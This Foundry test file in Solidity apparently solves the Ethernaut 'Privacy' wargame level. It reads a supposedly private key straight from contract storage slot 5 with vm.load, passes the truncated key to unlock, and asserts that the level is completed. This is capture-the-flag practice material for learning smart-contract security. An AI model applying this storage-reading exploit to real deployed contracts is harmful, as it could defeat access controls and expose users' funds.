// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import {BaseTest} from "./BaseTest.t.sol";
import {PrivacyFactory} from "../src/Privacy/PrivacyFactory.sol";
import {Privacy} from "../src/Privacy/Privacy.sol";

contract PrivacyTest is BaseTest {
    function testPrivacyHack() public {
        ////////////////////*/
        //    Level Setup
        ////////////////////*/
        PrivacyFactory factory = new PrivacyFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Privacy ethernautPrivacy = Privacy(payable(levelAddress));

        ////////////////////*/
        //   Level Attack
        ////////////////////*/
        bytes32 key = vm.load(levelAddress, bytes32(uint256(5)));
        ethernautPrivacy.unlock(bytes16(key));
        assertEq(ethernautPrivacy.locked(), false);

        //////////////////////*/
        //  Level Submission
        //////////////////////*/
        bool levelCompleted = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assertEq(levelCompleted, true);
    }
}
